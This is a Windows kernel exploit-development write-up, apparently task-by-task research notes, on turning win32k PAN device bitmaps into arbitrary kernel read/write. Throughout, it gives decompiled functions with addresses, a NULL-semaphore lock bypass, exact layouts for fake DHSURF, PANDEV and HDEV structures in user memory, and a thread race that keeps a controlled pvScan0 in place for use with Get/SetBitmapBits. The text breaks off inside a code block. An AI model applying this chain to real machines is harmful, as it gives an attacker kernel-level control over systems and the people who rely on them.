# PAN Device Bitmap Exploit — Semaphore Solution Analysis

## Executive Summary

**The semaphore blocker is bypassable.** The solution is a **NULL HSEMAPHORE bypass**: all three Eng semaphore functions (`EngAcquireSemaphore`, `EngReleaseSemaphore`, `EngAcquireSemaphoreShared`) check for NULL and silently skip execution when the HSEMAPHORE is zero. By placing NULL at `*(dhsurf+0x20)+0x308` (the PANDEV semaphore) and `dhsurf+0x18` (the second lock semaphore), every semaphore call in the lock/unlock path becomes a no-op. The `EngModifySurface` write of controlled pvScan0 to SURFACE+0x50 proceeds unimpeded.

A secondary **TOCTOU race** on the count field at `DHSURF+0x14` (or alternatively, mutating `PANDEV+0x30` HDEV) prevents the destructor from reverting pvScan0, yielding persistent arbitrary kernel R/W via Get/SetBitmapBits.

---

## Task 1: What is HSEMAPHORE?

### a) EngCreateSemaphore (win32kbase.sys @ 0x1C005C01E)

```c
HSEMAPHORE EngCreateSemaphore(void) {
    return (HSEMAPHORE)GreCreateSemaphoreInternal(1);
}
```

### b) GreCreateSemaphoreInternal (win32kbase.sys @ 0x1C005C364)

```c
__int64 GreCreateSemaphoreInternal(char a1) {
    __int64 v2 = Win32AllocPoolNonPaged(136, 1835365191);  // 136 = 0x88 bytes, non-paged pool
    if (v2) {
        __int64 v3 = v2 + 32;  // HSEMAPHORE = allocation_base + 0x20
        if (ExInitializeResourceLite((PERESOURCE)(v2 + 32)) >= 0) {
            MultiUserGreTrackAddEngResource(v2, (a1 & 1) != 0 ? 4 : 1);
            // ...
            return v3;  // Returns pool_base + 0x20
        }
        Win32FreePool(v2);
    }
    return 0;
}
```

### c) HSEMAPHORE Type

**HSEMAPHORE is a kernel non-paged pool pointer to an ERESOURCE structure.**

- It is NOT a KSEMAPHORE (dispatcher object).
- It is NOT a handle or index.
- It is a raw kernel pointer: `pool_allocation_base + 0x20`.
- The ERESOURCE is initialized by `ExInitializeResourceLite`.
- The allocation is 136 bytes (0x88) in non-paged pool, with the ERESOURCE at offset +0x20 from the base.
- Tag: `0x6F6C5350` = "SPlO" (SparkPoolLock).

### d) Structure Layout

```
GreCreateSemaphoreInternal allocation (136 bytes, non-paged pool):
  +0x00: tracking metadata (8 bytes used by MultiUserGreTrackAddEngResource)
  +0x18: field set to 0 after init
  +0x20: ERESOURCE structure begins here  ← HSEMAPHORE points here
         (ERESOURCE is ~0x68 bytes on x64)
```

**HSEMAPHORE = PERESOURCE** — the `EngAcquireSemaphore` code casts it directly:
```c
ExEnterCriticalRegionAndAcquireResourceExclusive((PERESOURCE)hsem);
```

---

## Task 2: What does EngAcquireSemaphore do?

### a) Decompile (win32kbase.sys @ 0x1C003A226)

```c
void __stdcall EngAcquireSemaphore(HSEMAPHORE hsem) {
    if (hsem) {  // ← NULL CHECK: if NULL, does NOTHING
        PsEnterPriorityRegion();
        ExEnterCriticalRegionAndAcquireResourceExclusive((PERESOURCE)hsem);
    }
}
```

### b) Validation

**EngAcquireSemaphore performs exactly one validation: a NULL check.** If `hsem == 0`, the function returns immediately without calling `PsEnterPriorityRegion` or `ExEnterCriticalRegionAndAcquireResourceExclusive`. No kernel address validation, no pool tag check, no ownership check.

### c) Dereference behavior

When `hsem != NULL`, it is cast to `PERESOURCE` and passed to `ExEnterCriticalRegionAndAcquireResourceExclusive`, which dereferences it as an ERESOURCE structure. The ERESOURCE contains:
- `OWNER_ENTRY OwnerThread` (owner thread + count)
- `PERESOURCE OwnerTable` (shared owner table)
- `ULONG ActiveCount` / `ULONG Flag` / `KSPIN_LOCK SpinLock`
- `ULONG SharedCount`

### d) Can we fake a semaphore in user mode?

**No need to fake it — NULL bypasses entirely.** But for completeness: faking an ERESOURCE in user mode would be extremely fragile because `ExEnterCriticalRegionAndAcquireResourceExclusive` uses spinlocks (raising IRQL to DISPATCH), manipulates kernel dispatcher state, and writes to the ERESOURCE structure. Even with SMAP disabled (kernel can read user memory), the kernel writing to user-mode ERESOURCE fields would corrupt the structure and likely BSOD on release.

### e) SMAP consideration

SMAP being disabled in win32k context means the kernel CAN read/write user-mode memory without faulting. However, since `EngAcquireSemaphore(NULL)` skips all dereferences, SMAP is irrelevant for the NULL bypass path. The kernel never touches our user-mode buffer for semaphore operations.

### f) EngReleaseSemaphore (win32kbase.sys @ 0x1C0080B20)

```c
void __stdcall EngReleaseSemaphore(HSEMAPHORE hsem) {
    // ETW trace (harmless even with NULL — just logs the value)
    if (gbLockEtw && (Microsoft_Windows_Win32kEnableBits & 0x10) != 0)
        McTemplateK0pz_EtwWriteTransfer((_DWORD)hsem, ...);
    
    if (hsem) {  // ← NULL CHECK: if NULL, does NOTHING
        ExReleaseResourceAndLeaveCriticalRegion((PERESOURCE)hsem);
        PsLeavePriorityRegion();
    }
}
```

### g) EngAcquireSemaphoreShared (win32kbase.sys @ 0x1C014AFBC)

```c
void __stdcall EngAcquireSemaphoreShared(HSEMAPHORE hsem) {
    if (hsem) {  // ← NULL CHECK: if NULL, does NOTHING
        ExEnterPriorityRegionAndAcquireResourceShared();
    }
    EtwTraceGreLockAcquireSemaphoreShared(L"hsem", hsem);  // harmless ETW trace
}
```

### CRITICAL FINDING

**All three semaphore functions have NULL checks.** Passing NULL as HSEMAPHORE causes all of them to skip their core operation and return immediately. The ETW traces in `EngReleaseSemaphore` and `EngAcquireSemaphoreShared` execute but are harmless — they merely log the NULL value.

---

## Task 3: Can we get a valid HSEMAPHORE from user mode?

### a) User-mode APIs returning HSEMAPHORE

**No user-mode API returns an HSEMAPHORE.** HSEMAPHORE is an internal win32k kernel object. It is not exposed through any GDI/User API surface.

### b) CreateSemaphoreEx / Win32 semaphore handles

Win32 semaphore handles (`CreateSemaphoreEx`, `OpenSemaphore`) return user-mode handles to `KSEMAPHORE` objects managed by the NT object manager. These are completely different from HSEMAPHORE (which is a non-paged pool pointer to an ERESOURCE). There is no conversion path.

### c) Relationship between Win32 semaphores and HSEMAPHORE

**None.** They are different primitives:
- Win32 semaphore: `KSEMAPHORE` (dispatcher header + count + limit), accessed via handle
- HSEMAPHORE: `ERESOURCE` (reader/writer lock), accessed via raw kernel pointer

### d) NtGdiGetDCDword returning HSEMAPHORE

**No.** See Task 12 for the full index mapping. No index returns a kernel pointer — all return DWORDs (32-bit values).

### Conclusion for Task 3

**We cannot obtain a valid HSEMAPHORE from user mode.** This path is a dead end. The NULL bypass (Task 6/7) is the solution.

---

## Task 4: Can we get the PANDEV kernel address?

### a) SystemHandleInformation

`NtQuerySystemInformation(SystemHandleInformation)` returns kernel object addresses for NT handles (process/thread/event/section/etc). GDI handles (HDC, HBITMAP) are NOT in the system handle table — they are managed by the win32k GDI handle table (`GdiSharedMemory`). SystemHandleInformation cannot leak GDI object kernel addresses.

### b) HDEV from user-mode API

HDEV is at `DC+0x30`. No user-mode API directly returns this value. `NtGdiGetDCDword` returns DWORDs from specific DC fields — none map to `DC+0x30` (see Task 12).

### c) PDEV from HDEV

HDEV is a handle to a PDEV in the GDI handle table. Even if we had HDEV, we'd need the GDI handle table base address to resolve it to a kernel PDEV pointer. The GDI handle table can be mapped via `GdiGetLocalHandle` or by mapping the shared section, but this gives handle entries, not direct PDEV kernel addresses.

### d) PANDEV+0x308 = HSEMAPHORE

If we knew the PANDEV kernel address, we could read PANDEV+0x308 to get the HSEMAPHORE. But we can't get PANDEV from user mode without a prior kernel read primitive — chicken-and-egg.

### Conclusion for Task 4

**Cannot get PANDEV kernel address from user mode.** The NULL bypass eliminates this need entirely.

---

## Task 5: Can we leak PANDEV via the display DC?

### a) Display DC on PAN-enabled display

Creating a display DC with `CreateDCW(L"DISPLAY", ...)` on a PAN-enabled display gives a DC with HDEV at `DC+0x30` pointing to the PAN PDEV. But we can't read `DC+0x30` from user mode.

### b) NtGdiGetDCDword indices

See Task 12 for the complete mapping. No index returns `DC+0x30` (HDEV) or any kernel pointer. All indices return 32-bit DWORD values from specific DC fields.

### c/d) HDEV → PDEV → PANDEV

Even with HDEV (a handle), resolving to the kernel PDEV requires access to the GDI handle table. The GDI handle table entries contain the object type and a kernel pointer, but extracting the kernel pointer requires either:
- Mapping the GDI shared section (process-specific, may not contain PDEV entries)
- A prior kernel read primitive (chicken-and-egg)

### Conclusion for Task 5

**Cannot leak PANDEV via the display DC.** No user-mode API exposes the HDEV or PDEV kernel address.

---

## Task 6: Can we bypass EngAcquireSemaphore entirely?

### a) `*(dhsurf+0x20)+0x308 = 0` (NULL HSEMAPHORE)

**YES — this is the solution.** `EngAcquireSemaphore(0)` checks `if (hsem)` which evaluates to FALSE, and the function returns immediately without acquiring any lock.

### b) NULL check

`EngAcquireSemaphore` explicitly checks for NULL:
```c
if (hsem) {  // FALSE when hsem == 0
    PsEnterPriorityRegion();
    ExEnterCriticalRegionAndAcquireResourceExclusive((PERESOURCE)hsem);
}
```

### c) Crash or skip?

**Skip.** No crash, no error, no side effect. The function is void — no return value to check. The caller has no way to know the semaphore wasn't acquired.

### d) `*(dhsurf+0x20) = 0` (NULL pPANDEV)

**NO — this would crash.** If `dhsurf+0x20 = 0`, then `*(dhsurf+0x20)` = 0, and `0 + 0x308 = 0x308`. `EngAcquireSemaphore(0x308)` would try to dereference `0x308` as an ERESOURCE, causing a null-page dereference BSOD.

**Correct approach**: Set `dhsurf+0x20` to a valid user-mode pointer (our fake PANDEV), and set `fakePANDEV+0x308 = 0`. Then `*(dhsurf+0x20)+0x308 = 0`, and `EngAcquireSemaphore(0)` skips.

### e) pPANDEV check in vLockBmp2AndPrepareForPunt

`vLockBmp2AndPrepareForPunt` does NOT check if pPANDEV is NULL before dereferencing. It directly calls:
```c
EngAcquireSemaphore(*(HSEMAPHORE *)(*(_QWORD *)(v5 + 32) + 776LL));
```
This reads `*(dhsurf+0x20)` as pPANDEV, then reads `*(pPANDEV+0x308)` as the semaphore value. Both reads hit user-mode memory (SMAP disabled). The semaphore value (0) is then passed to `EngAcquireSemaphore` which handles NULL gracefully.

### Conclusion for Task 6

**NULL HSEMAPHORE bypass works.** Set `dhsurf+0x20` to a user-mode pointer, and at that pointer + 0x308, store NULL (0). `EngAcquireSemaphore(NULL)` silently skips.

---

## Task 7: Can we create a fake semaphore in user mode?

### a) Expected structure

`EngAcquireSemaphore` expects an ERESOURCE (not a KSEMAPHORE). The ERESOURCE is a Windows kernel reader/writer lock with spinlocks, owner entries, and dispatcher-level synchronization.

### b) Fake KSEMAPHORE approach (LO's hypothesis)

LO hypothesized faking a KSEMAPHORE with `type=SemaphoreObject(5), state=Signaled(1)` so `KeWaitForSingleObject` returns immediately. **This approach is invalid** because `EngAcquireSemaphore` does NOT use `KeWaitForSingleObject` — it uses `ExEnterCriticalRegionAndAcquireResourceExclusive`, which operates on ERESOURCE, not KSEMAPHORE. The ERESOURCE acquisition path involves spinlocks, IRQL raising, and kernel dispatcher state that cannot be safely faked in user-mode memory.

### c) EngAcquireSemaphore decompile confirmation

```c
void EngAcquireSemaphore(HSEMAPHORE hsem) {
    if (hsem) {
        PsEnterPriorityRegion();
        ExEnterCriticalRegionAndAcquireResourceExclusive((PERESOURCE)hsem);
    }
}
```

No `KeEnterCriticalRegion` or `KeWaitForSingleObject`. The critical region entry is done by `PsEnterPriorityRegion` (a wrapper), and the acquisition is `ExEnterCriticalRegionAndAcquireResourceExclusive` which combines critical region + ERESOURCE exclusive acquisition.

### d) Why fake semaphore is unnecessary

The NULL check makes faking unnecessary. NULL is the simplest and safest "fake" — it requires no user-mode structure, no SMAP dependency, and no risk of kernel state corruption.

### Conclusion for Task 7

**Faking an ERESOURCE in user mode is not needed and would be dangerous.** The NULL bypass is the correct approach: `EngAcquireSemaphore(NULL)` skips entirely.

---

## Task 8: What does the PANDEV semaphore look like?

### a) bCreateSemaphores (win32kfull.sys @ 0x1C02961A0)

```c
__int64 bCreateSemaphores(struct _PANDEV *a1) {
    *((_QWORD *)a1 + 14) = EngCreateSemaphore();  // PANDEV+0x70  = general semaphore
    *((_QWORD *)a1 + 97) = EngCreateSemaphore();  // PANDEV+0x308 = punt semaphore ← THE ONE WE NEED
    
    v2 = EngAllocMem(6, 0x60, 0x6F6C5350);  // 96 bytes, tag "SPlO"
    *((_QWORD *)a1 + 98) = v2;  // PANDEV+0x310 = KSEMAPHORE allocation
    
    if (sem1 && sem2 && v2) {
        KeInitializeSemaphore(v2, 0, 0x7FFFFFFF);           // KSEMAPHORE: count=0, limit=MAX
        KeInitializeMutex((PRKMUTEX)(v2 + 32), 0);          // KMUTEX at v2+0x20
        
        // Grid of 9x9 = 81 semaphores starting at PANDEV+0x78
        v4 = (HSEMAPHORE *)((char *)a1 + 120);  // PANDEV+0x78
        for (row = 0; row < 9; row++) {
            for (col = 0; col < 9; col++) {
                *v4 = EngCreateSemaphore();
                v4++;
            }
        }
        return 1;  // success
    }
    return 0;  // failure
}
```

### b) Semaphores created

| Offset | Field | Type | Initial State |
|--------|-------|------|---------------|
| PANDEV+0x70 | General lock | HSEMAPHORE (ERESOURCE) | Unowned |
| PANDEV+0x308 | Punt lock | HSEMAPHORE (ERESOURCE) | Unowned |
| PANDEV+0x310 | Sync primitive | KSEMAPHORE (96 bytes) | Count=0, Limit=MAX |
| PANDEV+0x310+0x20 | Mutex | KMUTEX | Unowned |
| PANDEV+0x78..0x300 | 9x9 grid | 81 HSEMAPHORE (ERESOURCE) | Unowned |

### c) PANDEV+0x308 is the punt semaphore

The semaphore at `PANDEV+0x308` is the one used by `vLockBmp2AndPrepareForPunt` and `vLockBmp1AndPrepareForPunt` to protect the `EngModifySurface` call. It is an ERESOURCE created by `EngCreateSemaphore`, initially unowned (signaled/available).

### d) Initial state

ERESOURCE created by `ExInitializeResourceLite` starts in the unowned state — any thread can acquire it exclusively or shared. There is no "signaled" concept for ERESOURCE; it's available or owned.

---

## Task 9: Can we use a different PANSURFLOCK path that doesn't need a semaphore?

### a) PANSURFLOCK::vLockBmpAndPrepareForPunt (win32kfull.sys @ 0x1C0296804)

```c
void PANSURFLOCK::vLockBmpAndPrepareForPunt(__int64 **this) {
    v2 = (__int64 *)**this;                    // DHSURF
    *(this + 1) = v2;                           // save DHSURF
    EngAcquireSemaphore(*(HSEMAPHORE *)(v2[4] + 776));  // pPANDEV+0x308
    dhsurf = (DHSURF)*(this + 1);
    if (!*((_DWORD *)dhsurf + 5)) {             // count at DHSURF+0x14 == 0
        EngModifySurface(..., dhsurf, pvScan0, lDelta, nullptr);  // WRITE
    }
    ++*((_DWORD *)dhsurf + 5);                  // count++
    EngReleaseSemaphore(*(HSEMAPHORE *)((*(this + 1))[4] + 776));  // release pPANDEV+0x308
    EngAcquireSemaphore((HSEMAPHORE)(*(this + 1))[3]);  // DHSURF+0x18
}
```

**Same semaphore pattern as MULTIPANSURFLOCK.** Two semaphores: pPANDEV+0x308 and DHSURF+0x18. Both are NULL-checked by the Eng functions.

### b) Semaphore optional?

**No.** All PAN lock/unlock functions call `EngAcquireSemaphore` and `EngReleaseSemaphore`. There is no path where the semaphore is optional. However, the NULL check makes them no-ops.

### c) PanGradientFill (win32kfull.sys @ 0x1C0295200)

Uses `PANSURFLOCK` (single surface). Calls `PANSURFLOCK::PANSURFLOCK` constructor which calls `vLockBmpAndPrepareForPunt` for iType==3 surfaces. Same semaphore pattern.

### d) PanStrokePath (win32kfull.sys @ 0x1C02959C0)

Uses `PANSURFLOCK`. Same pattern.

### e) PanTextOut (win32kfull.sys @ 0x1C0295D10)

Uses `PANSURFLOCK`. Same pattern.

### f) PanBitBlt (win32kfull.sys @ 0x1C0294720)

Uses `MULTIPANSURFLOCK` (two surfaces). Calls `vLockBmp1AndPrepareForPunt` and/or `vLockBmp2AndPrepareForPunt`. Same semaphore pattern.

### g) vLockBmp1AndPrepareForPunt (win32kfull.sys @ 0x1C0296658)

```c
void MULTIPANSURFLOCK::vLockBmp1AndPrepareForPunt(__int64 **this, int a2) {
    v4 = (__int64 *)**this;                     // DHSURF
    *(this + 1) = v4;                            // save DHSURF
    EngAcquireSemaphore(*(HSEMAPHORE *)(v4[4] + 776));  // pPANDEV+0x308
    // ... EngModifySurface (if count == 0) ...
    ++count;
    EngReleaseSemaphore(*(HSEMAPHORE *)(... + 776));  // release pPANDEV+0x308
    v6 = (HSEMAPHORE)(*(this + 1))[3];           // DHSURF+0x18
    if (a2) EngAcquireSemaphoreShared(v6);       // shared or exclusive
    else    EngAcquireSemaphore(v6);
}
```

Same pattern: two semaphores, both NULL-checked.

### Conclusion for Task 9

**All PAN paths use the same two-semaphore pattern.** No semaphore-free path exists. The NULL bypass applies to all of them equally. Any PAN rendering function (BitBlt, GradientFill, StrokePath, TextOut) can trigger the exploit.

---

## Task 10: Can we use the HDEV from the display DC?

### a) HDEV at DC+0x30

The display DC has HDEV at `DC+0x30`. This is a handle to the PDEV in the GDI handle table.

### b) NtGdiGetDCDword

No index returns `DC+0x30`. See Task 12 for the full mapping.

### c) HDEV is a handle, not a pointer

Even if we could leak HDEV, it is a GDI handle (index into the handle table), not a direct kernel pointer. We'd need the handle table base to resolve it. The handle table can be accessed via `GdiGetLocalHandle` or by mapping the GDI shared section, but the PDEV entry would need to be found by type.

### d) Using HDEV in the fake DHSURF

The `EngModifySurface` call in `vLockBmp2AndPrepareForPunt` reads HDEV from `*(pPANDEV+0x30)`:
```c
*(HDEV *)(*((_QWORD *)dhsurf + 4) + 48LL)  // = *(HDEV*)(pPANDEV + 0x30)
```

For the write to succeed, `hdev` must be non-NULL (the `!hdev` check in `EngModifySurface`). But since the device bitmap's initial HDEV (`SURFACE+0x30`) is NULL (bitmap not selected into a DC), the HDEV mismatch check (`v16 && v16 != hdev`) is skipped — any non-NULL value works.

Since `v15` (surface flags) = 0x640000 (no high bit set), the HDEV deep validation (`hdev[45]`, `hdev[10]`) is also skipped. The only HDEV dereference is `*(QWORD*)(hdev + 0x708)` which goes to `SURFACE+0x28` — this reads from our user-mode fake HDEV (SMAP disabled), so we just need to zero it.

**We don't need a real HDEV.** Any non-NULL user-mode pointer works as a fake HDEV.

### Conclusion for Task 10

**A fake HDEV in user-mode memory suffices.** No need to leak the real HDEV from the display DC.

---

## Task 11: Alternative — use a REAL PAN device bitmap's DHSURF

### a-f) DC UAF info leak approach

This approach involves:
1. Create a legitimate device bitmap on the PAN display DC
2. Select it into a DC
3. Use DC UAF to leak the SURFACE's DHSURF field
4. Read PANDEV+0x308 from the leaked DHSURF

**This fails because DC deletion via TOCTOU fails (share count check).** The DC UAF approach to leak kernel pointers is not viable.

### Conclusion for Task 11

**DC UAF leak is not viable.** The NULL bypass eliminates the need for this approach entirely.

---

## Task 12: NtGdiGetDCDword index mapping

### NtGdiGetDCDword (win32kfull.sys @ 0x1C00FA520)

```c
__int64 NtGdiGetDCDword(HDC a1, int a2, _DWORD *a3) {
    DCOBJ::DCOBJ(v16, a1);
    if (!v16[0]) return 0;  // invalid DC
    
    switch (a2) {
        case 0:  // DC+0x48, bit 13 → boolean
            result = ((*(_DWORD *)(DC + 72) >> 13) & 1) == 0;
            break;
        case 1:  // *(DC+0x3D0) + 0x160 → DWORD
            result = *(_DWORD *)(*(_QWORD *)(DC + 976) + 352);
            break;
        case 2:  // *(DC+0x3D0) + 0x11C → DWORD
            result = *(_DWORD *)(*(_QWORD *)(DC + 976) + 284);
            break;
        case 3:  // *(DC+0x3D0) + 0x120 → DWORD
            result = *(_DWORD *)(*(_QWORD *)(DC + 976) + 288);
            break;
        case 4:  // DC+0xF8, complex palette logic
            result = DC+0xF8 & 4 with *(DC+0x3D0)+0x6C checks;
            break;
        case 5:  // DC+0x68 → DWORD
            result = *(_DWORD *)(DC + 104);
            break;
        case 6:  // dwGetFontLanguageInfo
            result = dwGetFontLanguageInfo(v16);
            break;
        case 7:  // DC+0x20 == 1 → boolean
            result = *(_DWORD *)(DC + 32) == 1;
            break;
        case 8:  // *(DC+0x3D0) + 0x68 → DWORD (MapMode)
            result = *(_DWORD *)(*(_QWORD *)(DC + 976) + 104);
            break;
        default:  // invalid
            return 0;
    }
    *a3 = result;
    return 1;
}
```

### Complete Index → DC Field Mapping

| Index | DC Offset | Field | Type |
|-------|-----------|-------|------|
| 0 | DC+0x48 | Bit 13 of flags | BOOL |
| 1 | *(DC+0x3D0)+0x160 | PDEV field | DWORD |
| 2 | *(DC+0x3D0)+0x11C | PDEV field | DWORD |
| 3 | *(DC+0x3D0)+0x120 | PDEV field | DWORD |
| 4 | DC+0xF8 | Palette flags | DWORD (complex) |
| 5 | DC+0x68 | Text align | DWORD |
| 6 | — | Font language info | DWORD |
| 7 | DC+0x20 | iType == 1 | BOOL |
| 8 | *(DC+0x3D0)+0x68 | MapMode | DWORD |
| 9+ | — | Invalid | — |

### NtGdiGetAndSetDCDword (win32kfull.sys @ 0x1C010C5D0)

Similar structure with set capability. Valid indices: 1, 2, 4, 6, 7, 8, 9. Same fields, no HDEV.

### Key findings

- **No index returns HDEV (DC+0x30).** HDEV is a 64-bit handle; all indices return 32-bit DWORDs.
- **No index returns SURFACE pointer (DC+0x1F0).** No kernel pointers are leaked.
- **DC+0x3D0** is a pointer to a DC-level structure (likely PDEV or DC_ATTR), but it's only dereferenced in kernel mode — the returned values are DWORDs from that structure, not the pointer itself.

### Conclusion for Task 12

**NtGdiGetDCDword cannot leak HDEV, SURFACE, or any kernel pointer.** All indices return 32-bit DWORD values. This path cannot provide the PANDEV address or HSEMAPHORE.

---

## Task 13: THE KEY QUESTION — Solution Matrix

### A. Create a fake semaphore in user mode that EngAcquireSemaphore accepts

**NOT NEEDED — NULL bypass is superior.** While SMAP being disabled means the kernel CAN read user-mode memory, faking an ERESOURCE is complex and fragile. The ERESOURCE acquisition path uses spinlocks, raises IRQL, and modifies kernel dispatcher state. Faking this in user-mode memory risks BSOD.

**Verdict: Possible but unnecessary. Use NULL instead.**

### B. Obtain a valid HSEMAPHORE from the PAN display DC via a user-mode API

**IMPOSSIBLE.** No user-mode API returns HSEMAPHORE. NtGdiGetDCDword only returns DWORDs. SystemHandleInformation doesn't cover GDI handles. DC UAF fails (share count check).

**Verdict: Dead end.**

### C. Bypass the EngAcquireSemaphore call entirely

**YES — THIS IS THE SOLUTION.** `EngAcquireSemaphore(NULL)` checks `if (hsem)` and skips all operations when hsem is 0. `EngReleaseSemaphore(NULL)` and `EngAcquireSemaphoreShared(NULL)` have the same NULL check.

**Setup:**
- `dhsurf+0x20` = pointer to user-mode buffer (fake PANDEV)
- `fakePANDEV+0x308` = 0 (NULL HSEMAPHORE)
- `dhsurf+0x18` = 0 (NULL second HSEMAPHORE)

**Result:** All 6 semaphore calls in the lock/unlock path become no-ops:
1. `EngAcquireSemaphore(NULL)` → skip (pPANDEV+0x308)
2. `EngReleaseSemaphore(NULL)` → skip (pPANDEV+0x308)
3. `EngAcquireSemaphore(NULL)` or `EngAcquireSemaphoreShared(NULL)` → skip (DHSURF+0x18)
4. `EngReleaseSemaphore(NULL)` → skip (DHSURF+0x18, in destructor)
5. `EngAcquireSemaphore(NULL)` → skip (pPANDEV+0x308, in destructor)
6. `EngReleaseSemaphore(NULL)` → skip (pPANDEV+0x308, in destructor)

**Verdict: WORKS. This is the primary solution.**

### D. Use a different code path that doesn't require a semaphore

**No semaphore-free path exists.** All PAN lock functions (MULTIPANSURFLOCK and PANSURFLOCK variants) use the same two-semaphore pattern. However, the NULL bypass applies to all of them, making this moot.

**Verdict: Not needed — NULL bypass works on all paths.**

---

## Complete Exploit Chain

### Prerequisites

1. **PAN mode enabled** (admin registry key + `ChangeDisplaySettings`)
2. **SMAP disabled in win32k context** (confirmed — kernel can read/write user-mode memory without faulting)
3. **Admin privileges** (for registry changes and PAN mode enable)

### Fake DHSURF Structure (user-mode memory)

```
DHSURF layout (our user-mode buffer):
  +0x00: [unused by lock path]
  +0x08: pvScan0          = target kernel address for R/W (QWORD)
  +0x10: lDelta           = bitmap stride (DWORD) — must be non-zero for write path
  +0x14: count            = 0 (DWORD) — must be 0 for EngModifySurface to fire
  +0x18: HSEMAPHORE_2     = 0 (NULL) — second semaphore, NULL = skip
  +0x20: pPANDEV          = pointer to fake PANDEV (user-mode buffer)
```

### Fake PANDEV Structure (user-mode memory)

```
PANDEV layout (our user-mode buffer):
  +0x30: HDEV             = non-NULL user-mode pointer (fake HDEV)
         (Only needs: +0x708 = 0 for the *(QWORD*)(hdev+0x708) dereference)
         (v15 = 0x640000, no high bit → hdev[45]/hdev[10] checks skipped)
  +0x308: HSEMAPHORE_1    = 0 (NULL) — punt semaphore, NULL = skip
```

### Fake HDEV Structure (user-mode memory, pointed to by PANDEV+0x30)

```
HDEV layout (our user-mode buffer, at least 0x710 bytes):
  +0x28:  0x400  (only needed if v15 < 0, which it's not — but safe to set)
  +0xB4:  0      (only needed if v15 < 0)
  +0x708: 0      (always dereferenced: *(QWORD*)(hdev+0x708) → SURFACE+0x28)
```

### Surface Flags After CreateDriverSurfMem (type=3)

```
SURFACE+0x64 (iType) = 3 (STYPE_DEVBITMAP)
SURFACE+0x70 (flags) = 0x640000 = 0x400000 | 0x200000 | 0x40000
  0x400000: set because a2==3 in CreateDriverSurfMem
  0x200000: always set
  0x40000:  set because format has 0x8000 bit (from NtGdiEngCreateDeviceBitmap)
```

### EngModifySurface Write Path Validation (all pass)

| Check | Condition | Result |
|-------|-----------|--------|
| `!hdev` | hdev = non-NULL user-mode ptr | PASS |
| `HmgShareLockIgnoreStockBit(hsurf)` | valid HBITMAP | PASS |
| `(flSurface & 0xFFFFFFF0) != 0` | flSurface = 0 | PASS |
| `pvReserved == nullptr` | nullptr passed | TRUE |
| `(v15 & 0x400000) == 0 && iType != 1` | 0x400000 IS set | FALSE → v14 stays TRUE |
| `v16 && v16 != hdev` | v16 = 0 (no existing HDEV) | FALSE → v14 stays TRUE |
| `v15 < 0 && ...` | v15 = 0x640000 (no high bit) | FALSE → skip HDEV deep check |
| `(v17 & 0x1000) != 0 \|\| (flSurface & 1) == 0` | flSurface=0, (0&1)==0 | TRUE → v19 = v14 = TRUE |

### EngModifySurface Write Result

```
SURFACE+0x48 = pvScan0 (our controlled kernel address)  [for positive lDelta]
SURFACE+0x50 = pvScan0 (our controlled kernel address)  ← THE TARGET WRITE
SURFACE+0x58 = lDelta (our controlled stride)
SURFACE+0x64 = 0 (iType = STYPE_BITMAP)
SURFACE+0x30 = hdev (our fake HDEV)
SURFACE+0x28 = *(hdev+0x708) = 0
SURFACE+0x18 = dhsurf (our fake DHSURF)
SURFACE+0x70 = 0 | (0x640000 & 0xFFFC4A10) = 0x640000
```

### The Revert Problem

After `EngBitBlt` completes, the `MULTIPANSURFLOCK` destructor calls `vUnLockBmp2AndRemovePunt` (or `vUnLockBmp1AndRemovePunt`), which:

1. `EngReleaseSemaphore(NULL)` → skip (DHSURF+0x18)
2. `EngAcquireSemaphore(NULL)` → skip (pPANDEV+0x308)
3. `--count` → count goes from 1 to 0 (at DHSURF+0x14, user-mode memory)
4. `if (count == 0)` → TRUE → `EngModifySurface` revert runs:
   - Sets SURFACE+0x50 = 0 (clears pvScan0!)
   - Sets SURFACE+0x48 = 0
   - Sets SURFACE+0x58 = 0
   - Sets SURFACE+0x64 = 3 (iType = STYPE_DEVBITMAP)
5. `EngReleaseSemaphore(NULL)` → skip (pPANDEV+0x308)

**The revert clears our pvScan0.** We must prevent it.

### Revert Prevention: TOCTOU Race on Count

The count field at `DHSURF+0x14` is in user-mode memory. The kernel reads and writes it with SMAP disabled.

**Race strategy:**
1. **Thread A**: calls `BitBlt(hdcPan, ...)` with the device bitmap selected
2. **Kernel**: `vLockBmp2` → count 0→1, `EngModifySurface` writes pvScan0, then `EngBitBlt` starts
3. **Thread B**: writes `count = 2` to `DHSURF+0x14` (user-mode memory)
4. **Kernel**: `EngBitBlt` finishes, destructor runs → `--count` = 2-1 = 1, `count != 0` → **revert skipped!**
5. **Thread A**: `BitBlt` returns
6. **Thread A**: `GetBitmapBits(hBitmap, ...)` → reads from `SURFACE+0x50` (our pvScan0) → **arbitrary kernel read**
7. **Thread A**: `SetBitmapBits(hBitmap, ...)` → writes to `SURFACE+0x50` (our pvScan0) → **arbitrary kernel write**

The race window is the entire `EngBitBlt` execution duration (step 2-4), which is typically milliseconds for a non-trivial blit. Thread B can spam writes to `DHSURF+0x14` in a tight loop for near-100% reliability.

### Alternative Revert Prevention: HDEV Mismatch

Instead of racing the count, change `PANDEV+0x30` (HDEV) during `EngBitBlt`:

1. **Initial state**: `PANDEV+0x30` = non-NULL (fake HDEV_A) → write succeeds, SURFACE+0x30 = HDEV_A
2. **Thread B**: writes `PANDEV+0x30 = 0` (NULL) or a different value (HDEV_B)
3. **Destructor revert**: reads `hdev = *(PANDEV+0x30)` = NULL or HDEV_B
   - If NULL: `!hdev` → EngModifySurface returns FALSE → **revert skipped**
   - If HDEV_B: `v16 = SURFACE+0x30 = HDEV_A`, `v16 && v16 != hdev` → TRUE → v14 = FALSE → **revert skipped**

**This is simpler and has a wider race window** — just change PANDEV+0x30 at any time during the BitBlt.

### Combined Approach (maximum reliability)

Thread B continuously writes during EngBitBlt:
- `DHSURF+0x14 = 2` (prevent count-based revert)
- `PANDEV+0x30 = 0` (prevent HDEV-based revert)

Both the count check AND the HDEV validation fail, guaranteeing the revert is skipped.

### After Revert Prevention

```
SURFACE+0x50 = our controlled pvScan0 (PERSISTENT)
SURFACE+0x58 = our controlled lDelta (PERSISTENT)
SURFACE+0x64 = 0 (STYPE_BITMAP)
```

Call `NtGdiGetBitmapBits` / `NtGdiSetBitmapBits` on the HBITMAP:
- GDI reads `SURFACE+0x50` (pvScan0) as the bitmap data base address
- Reads/writes `height * lDelta` bytes starting at pvScan0
- If pvScan0 = kernel address → **arbitrary kernel R/W**

### NtGdiEngCreateDeviceBitmap — No UMPD Check

```c
// NtGdiEngCreateDeviceBitmap (win32kfull.sys @ 0x1C02B2310)
